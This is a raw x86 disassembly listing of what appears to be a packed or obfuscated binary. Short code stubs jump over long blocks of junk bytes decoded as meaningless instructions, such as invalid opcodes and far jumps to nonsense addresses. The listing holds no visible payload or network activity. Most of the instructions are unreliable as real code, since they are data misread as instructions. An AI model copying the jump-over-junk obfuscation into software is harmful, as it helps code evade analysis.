  40bc93:	mov    WORD PTR [eax],?
  40bc95:	pop    edx
  40bc96:	pop    ebp
  40bc97:	fldlg2 
  40bc99:	(bad)  
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	cmp    ebx,DWORD PTR [edx]
  40bca3:	pop    eax
  40bca4:	ret    0xd58c
  40bca7:	scas   eax,DWORD PTR es:[edi]
  40bca8:	jg     0x40bca9
  40bcaa:	out    0x51,eax
  40bcac:	stos   DWORD PTR es:[edi],eax
  40bcad:	int    0xd8
  40bcaf:	inc    edi
  40bcb0:	mov    edx,eax
  40bcb2:	pop    ebx
  40bcb3:	loope  0x40bca0
  40bcb5:	push   esp
  40bcb6:	leave  
  40bcb7:	jg     0x40bcf7
  40bcb9:	fst    QWORD PTR [eax-0xe03b397]
  40bcbf:	std    
  40bcc0:	mov    edi,esi
  40bcc2:	mov    WORD PTR [esi+ebx*4+0x69a58bc8],?
  40bcc9:	aas    
  40bcca:	sar    BYTE PTR [esp+esi*8-0x79616f23],cl
  40bcd1:	dec    eax
  40bcd2:	mov    ebp,DWORD PTR [eax+ecx*2]
  40bcd5:	cdq    
  40bcd6:	jnp    0x40bc5c
  40bcd8:	test   BYTE PTR fs:[esp+ecx*2+0x7a8cf43f],0xbd
  40bce1:	mov    bl,0xa3
  40bce3:	lahf   
  40bce4:	mov    bh,0x48
  40bce6:	push   esi
  40bce7:	lea    edx,[edx-0x29f1e58d]
  40bced:	mov    ebp,0xf6718c52
  40bcf2:	sbb    DWORD PTR ds:0xc747eb2f,0xef531155
  40bcfc:	xchg   ebx,eax
  40bcfd:	sbb    ebp,esi
  40bcff:	mov    bh,0xd3
  40bd01:	mov    ds:0x704017a9,al
  40bd06:	out    dx,eax
  40bd07:	dec    ebx
  40bd08:	add    al,0xc5
  40bd0a:	xchg   esp,eax
  40bd0b:	jb     0x40bcfe
  40bd0d:	rcl    DWORD PTR [edi+0x21264496],1
  40bd13:	stos   DWORD PTR es:[edi],eax
  40bd14:	pop    esi
  40bd15:	push   eax
  40bd16:	mov    bl,0xf9
  40bd18:	outs   dx,DWORD PTR ds:[esi]
  40bd19:	and    edx,DWORD PTR [esi+0x5c]
  40bd1c:	sub    BYTE PTR [edi],ch
  40bd1e:	sbb    eax,0x7bf2ae8
  40bd23:	and    al,ah
  40bd25:	jb     0x40bd35
  40bd27:	dec    esp
  40bd29:	test   al,0x98
  40bd2b:	sbb    ecx,DWORD PTR [edx-0x7b]
  40bd2e:	mov    ds:0x507e41d0,eax
  40bd33:	xor    BYTE PTR [edi],dl
  40bd35:	inc    ecx
  40bd36:	(bad)  
  40bd37:	sbb    BYTE PTR [ebx],bl
  40bd39:	xchg   esi,eax
  40bd3a:	mov    WORD PTR [ebp+ecx*8-0x34626694],gs
  40bd41:	loop   0x40bd01
  40bd43:	lods   eax,DWORD PTR ds:[esi]
  40bd44:	ins    DWORD PTR es:[edi],dx
  40bd45:	aad    0xee
  40bd47:	and    DWORD PTR [esi+0x72],esp
  40bd4a:	stos   BYTE PTR es:[edi],al
  40bd4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd4c:	cdq    
  40bd4d:	or     eax,0x1
  40bd50:	cmc    
  40bd51:	push   ss
  40bd52:	xchg   ebp,eax
  40bd53:	out    dx,eax
  40bd54:	ja     0x40bd63
  40bd56:	push   ss
  40bd57:	enter  0x6111,0xba
  40bd5b:	rcl    BYTE PTR [ebx-0x5ca92bad],1
  40bd61:	xor    bl,0x69
  40bd64:	sbb    al,0x4e
  40bd66:	xor    DWORD PTR [edi+0x65],esp
  40bd69:	and    edx,edi
  40bd6b:	sub    al,0x73
  40bd6d:	push   ecx
  40bd6e:	xchg   BYTE PTR [edi+0x3eba1386],ah
  40bd74:	mov    bh,BYTE PTR [esi-0x9]
  40bd77:	jle    0x40bd9a
  40bd79:	xor    al,0xa3
  40bd7b:	jge    0x40bdcf
  40bd7d:	or     al,0x59
  40bd7f:	sbb    esp,DWORD PTR [ebp+0x753e62c6]
  40bd85:	ins    DWORD PTR es:[edi],dx
  40bd86:	push   ebp
  40bd87:	or     ch,dl
  40bd89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd8a:	loop   0x40bd66
  40bd8c:	pushf  
  40bd8d:	jno    0x40bdd0
  40bd8f:	retf   
  40bd90:	sbb    DWORD PTR [edi+edx*8-0x23],ebp
  40bd94:	pop    eax
  40bd95:	retf   
  40bd96:	int    0x7
  40bd98:	pop    ecx
  40bd99:	xor    al,BYTE PTR [ecx+0x697eac25]
  40bd9f:	jge    0x40bd6f
  40bda1:	sbb    DWORD PTR [esi],esp
  40bda3:	js     0x40bd76
  40bda5:	hlt    
  40bda6:	xchg   ebx,eax
  40bda7:	fidivr WORD PTR ds:0xbcf9d121
  40bdad:	mov    ch,0xad
  40bdaf:	jg     0x40bd68
  40bdb1:	fld    TBYTE PTR [ecx-0x5affe1cd]
  40bdb7:	or     eax,0x44a08310
  40bdbc:	out    dx,eax
  40bdbd:	loop   0x40bdff
  40bdbf:	mov    ds:0x801942eb,al
  40bdc4:	fmul   DWORD PTR [ebp-0x73cfac04]
  40bdca:	pop    edx
  40bdcb:	adc    ecx,edx
  40bdcd:	mov    edi,0x4a8722e
  40bdd2:	dec    eax
  40bdd3:	fiadd  WORD PTR [edx-0x4c]
  40bdd6:	pusha  
  40bdd7:	pop    ebx
  40bdd8:	and    bl,BYTE PTR [ecx+0x1a]
  40bddb:	mov    DWORD PTR [esi],eax
  40bddd:	fsin   
  40bddf:	pop    edi
  40bde0:	cmc    
  40bde1:	or     BYTE PTR [esi],0xf4
  40bde4:	mov    esp,DWORD PTR [esi-0x5b5b1ee1]
  40bdea:	push   0xa1f9636b
  40bdef:	int3   
  40bdf0:	call   0xe6d:0x94783e7b
  40bdf7:	popa   
  40bdf8:	js     0x40bde8
  40bdfa:	(bad)  
  40bdfb:	mov    ds:0x15307a06,eax
  40be00:	pinsrw mm6,WORD PTR [esi],0x32
  40be04:	fwait
  40be05:	push   ebx
  40be06:	lahf   
  40be07:	jo     0x40be18
  40be09:	jecxz  0x40be28
  40be0b:	or     BYTE PTR ds:0xcf0548a6,dl
  40be11:	cdq    
  40be12:	and    al,BYTE PTR [eax+0x6b]
  40be15:	aad    0xd8
  40be17:	(bad)  
  40be18:	div    dl
  40be1a:	pusha  
  40be1b:	xchg   BYTE PTR [ebp-0x41d4818d],ah
  40be21:	sar    DWORD PTR [ecx],0x2f
  40be24:	and    eax,DWORD PTR [edi]
  40be26:	cli    
  40be27:	push   eax
  40be28:	jno    0x40be7a
  40be2a:	mov    ds:0xaa74f244,eax
  40be2f:	fild   DWORD PTR [esp+edi*2-0x39f167d3]
  40be36:	mov    ah,0xca
  40be38:	add    BYTE PTR [ecx-0x8b2ee91],0xdb
  40be3f:	retf   
  40be40:	cs jno 0x40bdf1
  40be43:	push   edi
  40be44:	sub    edi,DWORD PTR [ebp+0xa]
  40be47:	test   esi,edi
  40be49:	and    ebx,DWORD PTR [esi-0x58]
  40be4c:	push   edi
  40be4d:	mov    WORD PTR [edi+0x2d557759],ds
  40be53:	dec    ecx
  40be54:	into   
  40be55:	stc    
  40be56:	imul   esp,DWORD PTR [ebx-0x41459e9c],0x19
  40be5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be5e:	js     0x40be24
  40be60:	dec    edi
  40be61:	shl    DWORD PTR [edx+0x5f8f02e5],1
  40be67:	xchg   ebp,eax
  40be68:	dec    edx
  40be69:	enter  0x5217,0x76
  40be6d:	nop
  40be6e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be70:	jmp    0x472ea113
  40be75:	stc    
  40be76:	aaa    
  40be77:	inc    edx
  40be78:	aad    0xdf
  40be7a:	pushf  
  40be7b:	jle    0x40bee3
  40be7d:	jge    0x40be15
  40be7f:	jno    0x40be17
  40be81:	fwait
  40be82:	int3   
  40be83:	aaa    
  40be84:	test   eax,0x687388e3
  40be89:	in     al,0x2b
  40be8b:	mov    dh,0xf2
  40be8d:	dec    edi
  40be8e:	out    dx,al
  40be8f:	bound  edx,QWORD PTR ds:0x98e56b77
  40be95:	jg     0x40be5e
  40be97:	add    BYTE PTR [ebx+0x7e],dl
  40be9a:	xchg   ecx,eax
  40be9b:	mov    ch,0x4d
  40be9d:	lds    edi,FWORD PTR [ecx-0x2c]
  40bea0:	xor    DWORD PTR [ecx],ebx
  40bea2:	ja     0x40bf01
  40bea4:	adc    bh,bl
  40bea6:	sti    
  40bea7:	cmp    ah,al
  40bea9:	cli    
  40beaa:	lock and eax,0x3f888b69
  40beb0:	scas   al,BYTE PTR es:[edi]
  40beb1:	loope  0x40be85
  40beb3:	adc    ch,ch
  40beb5:	mov    ds:0xb32891b5,al
  40beba:	sbb    ch,bh
  40bebc:	pop    ecx
  40bebd:	imul   edx,eax,0x54906ad4
  40bec3:	mov    edx,0x83eb2b38
  40bec8:	es int3 
  40beca:	inc    ecx
  40becb:	inc    ecx
  40becc:	in     eax,dx
  40becd:	int3   
  40bece:	pop    es
  40becf:	stos   DWORD PTR es:[edi],eax
  40bed0:	pushf  
  40bed1:	sahf   
  40bed2:	pop    ecx
  40bed3:	mov    DWORD PTR [ecx+0x4acb5cfa],0x5e32b22d
  40bedd:	jae    0x40be94
  40bedf:	pop    ss
  40bee0:	jle    0x40bf0a
  40bee2:	cs in  eax,0xa0
  40bee5:	dec    edi
  40bee6:	sbb    dh,BYTE PTR ds:0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x2cf18bcf]
  40bf27:	aaa    
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bfae
  40bf31:	je     0x40bef4
  40bf33:	scas   eax,DWORD PTR es:[edi]
  40bf34:	add    eax,0x9322dd68
  40bf39:	cdq    
  40bf3a:	rcr    al,cl
  40bf3c:	mov    edi,0x54309762
  40bf41:	inc    edx
  40bf42:	or     DWORD PTR [esi],esp
  40bf44:	jbe    0x40bf76
  40bf46:	mov    eax,ds:0x97427d8d
  40bf4b:	jmp    0x9abe:0x9b6277be
  40bf52:	in     al,dx
  40bf53:	sub    al,0xb7
  40bf55:	push   ds
  40bf56:	xchg   esp,eax
  40bf57:	aas    
  40bf58:	loopne 0x40bf46
  40bf5a:	je     0x40bf3d
  40bf5c:	jbe    0x40bf8c
  40bf5e:	xchg   ecx,eax
  40bf5f:	aad    0x12
  40bf61:	add    eax,0xfdb6d387
  40bf66:	and    BYTE PTR [eax+0x77],dh
  40bf69:	push   es
  40bf6a:	sbb    BYTE PTR [ecx-0x3257d281],cl
  40bf70:	adc    eax,0xa143f9b8
  40bf75:	(bad)  
  40bf76:	mov    ebx,0x98d68e10
  40bf7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf7c:	push   edi
  40bf7d:	fcomp  DWORD PTR [eax]
  40bf7f:	repnz adc dh,bh
  40bf82:	arpl   WORD PTR [ebx],di
  40bf84:	push   es
  40bf85:	je     0x40bfc3
  40bf87:	xlat   BYTE PTR ds:[ebx]
  40bf88:	jb     0x40bfe7
  40bf8a:	(bad)  
  40bf8b:	mov    BYTE PTR [eax],0x85
  40bf8e:	int3   
  40bf8f:	sub    DWORD PTR [esi+0x1110caf5],0x5b5aadea
  40bf99:	jle    0x40bfa6
  40bf9b:	inc    eax
  40bf9c:	jle    0x40bf63
  40bf9e:	test   DWORD PTR [ebp+ebx*4-0x5f1de596],ebx
  40bfa5:	jnp    0x40bf97
  40bfa7:	cmp    esi,DWORD PTR [edi]
  40bfa9:	(bad)  
  40bfab:	cmp    esp,DWORD PTR [ebx+0x3cafba98]
  40bfb1:	and    al,0x32
  40bfb3:	jnp    0x40bf6c
  40bfb5:	sbb    eax,0xcdb128c4
  40bfba:	popf   
  40bfbb:	cmp    al,0xe3
  40bfbd:	mov    bh,0x29
  40bfbf:	inc    ebx
  40bfc0:	pop    ebx
  40bfc1:	mov    dh,0xcc
  40bfc3:	lds    esi,FWORD PTR [ebx+0x9]
  40bfc6:	je     0x40bf5f
  40bfc8:	dec    ecx
  40bfc9:	inc    ebx
  40bfca:	jp     0x40bfba
  40bfcc:	stos   DWORD PTR es:[edi],eax
  40bfcd:	aad    0xa3
  40bfcf:	fisub  DWORD PTR [edi-0x7e2c6273]
  40bfd5:	lods   eax,DWORD PTR ds:[esi]
  40bfd6:	test   eax,0xf0083e6d
  40bfdb:	adc    ebp,DWORD PTR [edx+0xe]
  40bfde:	xor    eax,0x6e399ef9
  40bfe3:	aad    0xa7
  40bfe5:	adc    al,0x63
  40bfe7:	add    dl,BYTE PTR [ecx]
  40bfe9:	aas    
  40bfea:	inc    ebp
  40bfeb:	pop    ebp
  40bfec:	fwait
  40bfed:	push   ss
  40bfee:	jne    0x40bfe2
  40bff0:	sbb    edi,DWORD PTR [edi+0x40d2dc25]
  40bff6:	into   
  40bff7:	inc    ebx
  40bff8:	push   DWORD PTR [edi]
  40bffa:	cmp    DWORD PTR [esi+0x0],ebx
  40bffd:	or     eax,0xc61fd7e3
  40c002:	and    al,0xd1
  40c004:	(bad)  
  40c005:	jecxz  0x40c017
  40c007:	mov    bh,0x94
  40c009:	xchg   ecx,eax
  40c00a:	or     ch,BYTE PTR [edx+0x5a]
  40c00d:	add    BYTE PTR [ecx-0xd5f359b],dl
  40c013:	sbb    al,BYTE PTR [edx-0x7d32f5c1]
  40c019:	xchg   ecx,eax
  40c01a:	xchg   ebp,eax
  40c01b:	test   DWORD PTR [ebx+0x662216a2],eax
  40c021:	out    dx,al
  40c022:	(bad)  
  40c023:	rcl    BYTE PTR [esi],cl
  40c025:	les    esi,FWORD PTR [ecx+0x4f]
  40c028:	mov    eax,ds:0xa7e41987
  40c02d:	es dec esi
  40c02f:	jg     0x40bffc
  40c031:	dec    eax
  40c032:	push   esi
  40c033:	aam    0x14
  40c035:	psubsb mm7,QWORD PTR [eax]
  40c038:	jl     0x40c001
  40c03a:	xchg   esi,eax
  40c03b:	sar    esp,1
  40c03d:	stc    
  40c03e:	js     0x40c033
  40c040:	xchg   esi,eax
  40c041:	pop    esp
  40c042:	lock push ecx
  40c044:	cdq    
  40c045:	repz je 0x40c043
  40c048:	stos   BYTE PTR es:[edi],al
  40c049:	pop    edi
  40c04a:	sub    ah,BYTE PTR [ebx+0x5633e0d8]
  40c050:	in     al,dx
  40c051:	stos   DWORD PTR es:[edi],eax
  40c052:	pop    ebp
  40c053:	pushf  
  40c054:	shl    DWORD PTR [ecx+0x1e966af2],cl
  40c05a:	ds pushf 
  40c05c:	mov    ch,0xd
  40c05e:	push   es
  40c05f:	xor    al,0xe5
  40c061:	adc    cl,BYTE PTR [ecx]
  40c063:	push   ss
  40c064:	push   esi
  40c065:	lahf   
  40c066:	leave  
  40c067:	or     eax,0xd6ae3f9
  40c06c:	jmp    0x40c0c7
  40c06e:	xchg   edi,eax
  40c06f:	and    bl,BYTE PTR [edx+0x7d634790]
  40c075:	enter  0x9e85,0x27
  40c079:	push   ebx
  40c07a:	sbb    BYTE PTR [edi-0x77a95f02],dh
  40c080:	rcl    BYTE PTR [ebx-0xa],1
  40c083:	das    
  40c084:	jns    0x40c047
  40c086:	and    DWORD PTR [ecx+eiz*1+0x19],0xffffffa9
  40c08b:	lock and al,BYTE PTR [esi]
  40c08e:	ds es adc edx,ebp
  40c092:	pop    edx
  40c093:	jmp    0x7b12:0xb6e727d9
  40c09a:	sbb    DWORD PTR [ebx+0x38a0e65b],esi
  40c0a0:	mov    edi,0xd8b1c537
  40c0a5:	jo     0x40c042
  40c0a7:	adc    al,0x5c
  40c0a9:	push   ds
  40c0aa:	sub    ch,bl
  40c0ac:	fs mov cl,0x4d
  40c0af:	fdiv   DWORD PTR [ebx+0x3c5c8d3e]
  40c0b5:	xlat   BYTE PTR ds:[ebx]
  40c0b6:	pop    ebp
  40c0b7:	repnz or DWORD PTR [edx-0x7832effb],eax
  40c0be:	popa   
  40c0bf:	stos   DWORD PTR es:[edi],eax
  40c0c0:	add    bh,ah
  40c0c2:	jg     0x40c0d5
  40c0c4:	fst    DWORD PTR [ebx+0x2d566f8b]
  40c0ca:	add    al,0x7b
  40c0cc:	jnp    0x40c05f
  40c0ce:	je     0x40c112
  40c0d0:	popa   
  40c0d1:	stos   DWORD PTR es:[edi],eax
  40c0d2:	mov    bh,0x1b
  40c0d4:	outs   dx,BYTE PTR ds:[esi]
  40c0d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0d6:	rol    DWORD PTR [edi],0x2b
  40c0d9:	jb     0x40c07f
  40c0db:	xor    DWORD PTR [esi+eax*4-0x28153be6],ebp
  40c0e2:	pop    eax
  40c0e3:	push   edx
  40c0e4:	fmul   DWORD PTR [ebx-0x6de4fb84]
  40c0ea:	mov    dl,0x37
  40c0ec:	jmp    FWORD PTR [ebx-0xd]
  40c0ef:	mov    bl,0x71
  40c0f1:	xchg   edx,eax
  40c0f2:	je     0x40c160
  40c0f4:	xchg   ebp,eax
  40c0f5:	int3   
  40c0f6:	sub    DWORD PTR [esi+0xc51308a],ebp
  40c0fc:	loop   0x40c11f
  40c0fe:	ins    BYTE PTR es:[edi],dx
  40c0ff:	inc    edx
  40c100:	adc    esp,DWORD PTR [ebx]
  40c102:	in     al,0x6a
  40c104:	test   eax,0x577e8496
  40c109:	dec    ebx
  40c10a:	(bad)  
  40c10b:	retf   0x1b7c
  40c10e:	std    
  40c10f:	adc    DWORD PTR [edi+0x2],ebx
  40c112:	es inc eax
  40c114:	div    cl
  40c116:	pusha  
  40c117:	lock jmp 0xf2c27d8a
  40c11d:	stos   BYTE PTR es:[edi],al
  40c11e:	mov    cl,0xee
  40c120:	fs pop es
  40c122:	das    
  40c123:	sahf   
  40c124:	sar    ecx,0xdb
  40c127:	sbb    DWORD PTR [ebx],edi
  40c129:	mov    esi,0xd9a7009
  40c12e:	rcr    BYTE PTR [ebx+0x13b63672],0xfd
  40c135:	xchg   ecx,eax
  40c136:	lea    esp,[edx]
  40c138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c139:	mov    bl,ah
  40c13b:	pop    edx
  40c13c:	(bad)  ds:0x41f97d41
  40c142:	and    DWORD PTR [esi],edx
  40c144:	cmc    
  40c145:	pop    edi
  40c146:	sti    
  40c147:	aas    
  40c148:	stos   DWORD PTR es:[edi],eax
  40c149:	or     BYTE PTR [edx-0x34],al
  40c14c:	sub    BYTE PTR [ebx+0x53],bh
  40c14f:	fisub  DWORD PTR [esi]
  40c151:	jp     0x40c174
  40c153:	jg     0x40c11c
  40c155:	aam    0x7a
  40c157:	cmp    eax,0xfc978fb6
  40c15c:	in     eax,dx
  40c15d:	cmc    
  40c15e:	sti    
  40c15f:	test   ebp,eax
  40c161:	xor    eax,0x1eed6af9
  40c166:	adc    dl,dl
  40c168:	ret    
  40c169:	adc    al,0xc8
  40c16b:	mov    esp,0xbf0641f1
  40c170:	js     0x40c136
  40c172:	dec    edx
  40c173:	cmp    eax,0xcb87df60
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xa3
  40c196:	daa    
  40c197:	mov    al,ds:0x7e874a08
  40c19c:	jle    0x40c1d6
  40c19e:	jl     0x40c21e
  40c1a0:	jle    0x40c1c9
  40c1a2:	and    al,0xf5
  40c1a4:	in     al,dx
  40c1a5:	dec    eax
  40c1a6:	fisubr DWORD PTR [edi]
  40c1a8:	push   cs
  40c1a9:	and    al,cl
  40c1ab:	push   ebp
  40c1ac:	ror    DWORD PTR [edi+0x6abe6107],1
  40c1b2:	mov    esi,0xfce7c3b1
  40c1b7:	sbb    DWORD PTR [ecx-0x37cc52c1],esp
  40c1bd:	xchg   edx,eax
  40c1be:	jmp    0xed6c2094
  40c1c3:	or     al,0x4e
  40c1c5:	icebp  
  40c1c6:	jmp    0xcde4824d
  40c1cb:	ret    
  40c1cc:	jmp    0x40c15a
  40c1ce:	sbb    DWORD PTR [edx-0x6dcd2116],ecx
  40c1d4:	jmp    0x9688:0xe4a8be76
  40c1db:	es sub al,0x67
  40c1de:	sahf   
  40c1df:	sbb    eax,DWORD PTR [eax]
  40c1e1:	shl    BYTE PTR [ecx+esi*1-0x4d],cl
  40c1e5:	stc    
  40c1e6:	enter  0x2dbb,0xb4
  40c1ea:	test   eax,0x20691bfb
  40c1ef:	(bad)  
  40c1f0:	xor    cl,BYTE PTR [edx+0x31fd3fc6]
  40c1f6:	mov    al,0xc9
  40c1f8:	inc    ebp
  40c1f9:	push   ds
  40c1fa:	push   ebp
  40c1fb:	jo     0x40c1f5
  40c1fd:	adc    ecx,DWORD PTR [esi-0x286be55e]
  40c203:	imul   esp,DWORD PTR [esi],0xffffffb7
  40c206:	push   eax
  40c207:	ins    BYTE PTR es:[edi],dx
  40c208:	(bad)  
  40c209:	sub    al,BYTE PTR [edi-0x1f]
  40c20c:	push   eax
  40c20d:	mov    bl,0x2b
  40c20f:	add    al,BYTE PTR [ebx-0x49]
  40c212:	(bad)  
  40c214:	xchg   edi,eax
  40c215:	xor    DWORD PTR [ebx-0x73ea715f],eax
  40c21b:	in     al,0x59
  40c21d:	cmp    al,0xc9
  40c21f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c220:	mov    edi,0xa1c6876a
  40c225:	mov    ds:0xe4e87cb4,eax
  40c22a:	mov    ds:0x9543d915,al
  40c22f:	outs   dx,BYTE PTR ds:[esi]
  40c230:	add    DWORD PTR [ebx+0x54],eax
  40c233:	loop   0x40c205
  40c235:	ins    DWORD PTR es:[edi],dx
  40c236:	xor    BYTE PTR [esp+esi*1],cl
  40c239:	hlt    
  40c23a:	fdivrp st(6),st
  40c23c:	ret    0xa42b
  40c23f:	fiadd  DWORD PTR [edi+edx*2]
  40c242:	mov    ?,WORD PTR [esi+ebx*4-0x1]
  40c246:	pop    eax
  40c247:	mov    ebx,0x1e40b1d2
  40c24c:	je     0x40c1e5
  40c24e:	pop    ss
  40c24f:	daa    
  40c250:	(bad)  
  40c251:	mov    eax,ds:0xfa83c5b1
  40c256:	inc    esp
  40c257:	int    0xc7
  40c259:	enter  0x7057,0x41
  40c25d:	dec    esi
  40c25e:	inc    ecx
  40c25f:	adc    DWORD PTR [edx-0x77],esi
  40c262:	adc    DWORD PTR [ebp+0x5],eax
  40c265:	push   ebp
  40c266:	in     al,0x3b
  40c268:	lahf   
  40c269:	(bad)  
  40c26b:	icebp  
  40c26c:	mov    ds:0xdc4a5b50,eax
  40c271:	and    al,ah
  40c273:	(bad)  
  40c275:	and    ebx,DWORD PTR [ecx-0x41]
  40c278:	or     ah,BYTE PTR [edi-0x7618d8c0]
  40c27e:	dec    edx
  40c27f:	leave  
  40c280:	cld    
  40c281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c282:	sub    BYTE PTR [esi+0x3],0xf1
  40c286:	jb     0x40c21b
  40c288:	pop    ecx
  40c289:	mov    WORD PTR [ecx],gs
  40c28b:	fs jne 0x40c232
  40c28e:	mov    edx,0x1a42bbd2
  40c293:	add    DWORD PTR [ebp-0x55],edi
  40c296:	dec    ebx
  40c297:	pushf  
  40c298:	(bad)  
  40c299:	inc    esp
  40c29a:	xor    ecx,ebx
  40c29c:	jle    0x40c283
  40c29e:	add    bh,ah
  40c2a0:	ffree  st(5)
  40c2a2:	mov    ch,BYTE PTR [edx]
  40c2a4:	add    ax,0x5f3e
  40c2a8:	test   eax,0x45b03f26
  40c2ad:	sub    ebp,DWORD PTR [edx]
  40c2af:	adc    al,0x1e
  40c2b1:	jl     0x40c2f0
  40c2b3:	jo     0x40c2f9
  40c2b5:	jnp    0x40c2de
  40c2b7:	adc    bh,BYTE PTR [ebp-0x17]
  40c2ba:	aad    0xb1
  40c2bc:	sahf   
  40c2bd:	clc    
  40c2be:	das    
  40c2bf:	or     ecx,ebx
  40c2c1:	dec    esp
  40c2c2:	test   al,0x9d
  40c2c4:	xchg   esi,eax
  40c2c5:	in     eax,dx
  40c2c6:	retf   
  40c2c7:	lds    ebx,FWORD PTR [ebx-0x1b9fbe2d]
  40c2cd:	dec    esp
  40c2ce:	shl    DWORD PTR [esi+0x4189019b],cl
  40c2d4:	add    BYTE PTR [ebx-0x4a27f39a],0x2b
  40c2db:	jg     0x40c2a6
  40c2dd:	cdq    
  40c2de:	lahf   
  40c2df:	dec    ecx
  40c2e0:	mov    ds:0x62182bb0,eax
  40c2e5:	xor    al,0x8d
  40c2e7:	adc    DWORD PTR [ecx+esi*4-0x2f],ecx
  40c2eb:	sbb    BYTE PTR [edx+0x38a1c8ea],ch
  40c2f1:	sub    DWORD PTR [edi],esi
  40c2f3:	in     al,0x42
  40c2f5:	xor    dl,BYTE PTR ss:[eax]
  40c2f8:	repz inc edi
  40c2fa:	mov    esp,0x2ac57b0d
  40c2ff:	fwait
  40c300:	xchg   DWORD PTR [esi+0x4198e41e],esp
  40c306:	call   0xcf84:0xd10fb301
  40c30d:	or     al,0xb
  40c30f:	mov    ebp,0xa08eaef1
  40c314:	cmp    esi,DWORD PTR [ecx+0x668c6102]
  40c31a:	jns    0x40c337
  40c31c:	push   DWORD PTR [edx]
  40c31e:	mov    eax,ds:0x2854bf45
  40c323:	inc    esi
  40c324:	sub    edi,DWORD PTR ds:0xf9015a08
  40c32a:	lods   eax,DWORD PTR ds:[esi]
  40c32b:	push   cs
  40c32c:	pop    esp
  40c32d:	xchg   ecx,eax
  40c32e:	scas   al,BYTE PTR es:[edi]
  40c32f:	jmp    0x12b8:0xe621d98d
  40c336:	and    edi,DWORD PTR [edi]
  40c338:	je     0x40c338
  40c33a:	mov    edx,DWORD PTR [eax]
  40c33c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c33d:	sub    BYTE PTR [ebp-0x7fc565b1],dl
  40c343:	fiadd  WORD PTR ds:0xdb15ba47
  40c349:	xor    eax,0xa9543603
  40c34e:	mul    bl
  40c350:	add    DWORD PTR [edi],ebx
  40c352:	or     BYTE PTR [edi-0xc],bl
  40c355:	jns    0x40c39a
  40c357:	stc    
  40c358:	data16 jae 0x40c30b
  40c35b:	loopne 0x40c3db
  40c35d:	jmp    FWORD PTR [esi-0x5e5e103e]
  40c363:	inc    DWORD PTR [ebx-0x18ff6f74]
  40c369:	cmp    eax,0xa7eeb9f
  40c36e:	cmp    edx,DWORD PTR [eax+0x6d]
  40c371:	mov    edx,0x33456c1d
  40c376:	sti    
  40c377:	ss push ds
  40c379:	leave  
  40c37a:	out    0xf7,eax
  40c37c:	add    DWORD PTR [edi-0x85600f1],esi
  40c382:	dec    edx
  40c383:	icebp  
  40c384:	(bad)  
  40c385:	xchg   al,bh
  40c387:	les    ebx,FWORD PTR [edx+0x15]
  40c38a:	hlt    
  40c38b:	mov    eax,0x35356be1
  40c390:	dec    ecx
  40c391:	mov    eax,ds:0x52275
  40c396:	push   0xf3b31625
  40c39b:	mov    bl,0x25
  40c39d:	les    ebx,FWORD PTR [ebp-0x18faf8fe]
  40c3a3:	inc    edx
  40c3a4:	pusha  
  40c3a5:	stc    
  40c3a6:	jg     0x40c33d
  40c3a8:	push   ds
  40c3a9:	cld    
  40c3aa:	dec    esi
  40c3ab:	push   ebx
  40c3ac:	cmc    
  40c3ad:	mov    eax,0xfbd7e3c4
  40c3b2:	xor    edx,DWORD PTR [ecx+0x3b]
  40c3b5:	jo     0x40c3a8
  40c3b7:	aam    0x42
  40c3b9:	sub    al,0xe5
  40c3bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3bc:	out    0x15,eax
  40c3be:	shl    bl,1
  40c3c0:	arpl   WORD PTR [edi-0x77],dx
  40c3c3:	sti    
  40c3c4:	shl    DWORD PTR [esi+eiz*2],0xb2
  40c3c8:	call   0x17a1:0xa4b90e8f
  40c3cf:	and    BYTE PTR [esi],0x17
  40c3d2:	(bad)  
  40c3d3:	imul   DWORD PTR [ebx+0x59]
  40c3d6:	sub    DWORD PTR [eax+edx*8+0x46],ebp
  40c3da:	xchg   esp,eax
  40c3db:	sbb    esi,edi
  40c3dd:	and    al,0x59
  40c3df:	retf   
  40c3e0:	fstp   TBYTE PTR [ebx+0x35e3adc6]
  40c3e6:	adc    al,0x8b
  40c3e8:	inc    ebp
  40c3e9:	cld    
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
